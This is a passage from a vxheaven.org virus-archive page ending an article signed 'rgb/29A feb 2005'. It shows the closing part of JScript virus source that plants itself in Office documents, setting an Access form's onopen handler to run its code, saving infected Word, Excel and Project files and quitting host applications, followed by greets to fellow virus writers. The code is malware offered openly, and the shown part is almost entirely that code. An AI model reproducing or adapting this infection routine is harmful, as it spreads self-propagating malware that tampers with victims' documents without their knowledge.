&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; save<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; close<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">else</span> <span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span>h<span style="color: #339933;">==</span><span style="color: #CC0000;">3</span><span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//Access activation is via form open</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; q.<span style="color: #660066;">docmd</span>.<span style="color: #660066;">openform</span><span style="color: black;">&#40;</span>q.<span style="color: #660066;">currentproject</span>.<span style="color: #660066;">allforms</span><span style="color: black;">&#40;</span><span style="color: #CC0000;">0</span><span style="color: black;">&#41;</span>.<span style="color: #660066;">name</span><span style="color: #339933;">,</span><span style="color: #CC0000;">1</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; q.<span style="color: #660066;">forms</span><span style="color: black;">&#40;</span><span style="color: #CC0000;">0</span><span style="color: black;">&#41;</span>.<span style="color: #660066;">onopen</span><span style="color: #339933;">=</span><span style="color: #3366CC;">&quot;=&quot;</span><span style="color: #339933;">+</span>t<span style="color: #339933;">+</span><span style="color: #3366CC;">&quot;()&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; q.<span style="color: #660066;">docmd</span>.<span style="color: #660066;">save</span><span style="color: black;">&#40;</span><span style="color: #CC0000;">5</span><span style="color: #339933;">,</span>i<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">try</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; q.<span style="color: #660066;">activedocument</span>.<span style="color: #660066;">save</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">catch</span><span style="color: black;">&#40;</span>z<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">try</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; q.<span style="color: #660066;">activeworkbook</span>.<span style="color: #660066;">save</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">catch</span><span style="color: black;">&#40;</span>z<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">try</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; q.<span style="color: #660066;">filesave</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; q.<span style="color: #660066;">fileclose</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">catch</span><span style="color: black;">&#40;</span>z<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">catch</span><span style="color: black;">&#40;</span>z<span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span>h<span style="color: #339933;">!=</span><span style="color: #CC0000;">2</span><span style="color: #339933;">&amp;&amp;</span>h<span style="color: #339933;">!=</span><span style="color: #CC0000;">4</span><span style="color: black;">&#41;</span>q.<span style="color: #660066;">quit</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">//PowerPoint and Project are single-instance</span><br/>
&nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">catch</span><span style="color: black;">&#40;</span>z<span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #000066; font-weight: bold;">catch</span><span style="color: black;">&#40;</span>z<span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><span style="color: black;">&#125;</span><span style="color: black; font-style: italic;">// &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;//double slash to mark end of code</span><br/>
&nbsp;</div>
<p><strong>Greets to friendly people (A-Z):</strong></p>
<p>Active - Benny - Obleak - Prototype - Ratter - Ronin - RT Fishel - sars - The Gingerbread Man - Ultras - uNdErX - Vecna - VirusBuster - Whitehead</p>
<div align="right">
rgb/29A feb 2005<br/>
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="ff969e92a08d989dbf97908b929e9693d19c9092">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>
</div>[<a style="" href="/lib/?lang=EN&amp;index=MA#vrg17">Back to index</a>] [<a href="/lib/vrg17.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vrg17">de</a><a href="/lib/index.php?lang=en&amp;id=vrg17">en</a><a href="/lib/index.php?lang=es&amp;id=vrg17">es</a><a href="/lib/index.php?lang=it&amp;id=vrg17">it</a><a href="/lib/index.php?lang=fr&amp;id=vrg17">fr</a><a href="/lib/index.php?lang=pl&amp;id=vrg17">pl</a><a href="/lib/index.php?lang=ru&amp;id=vrg17">ru</a><a href="/lib/index.php?lang=ua&amp;id=vrg17">ua</a></div>
</body>
</html>
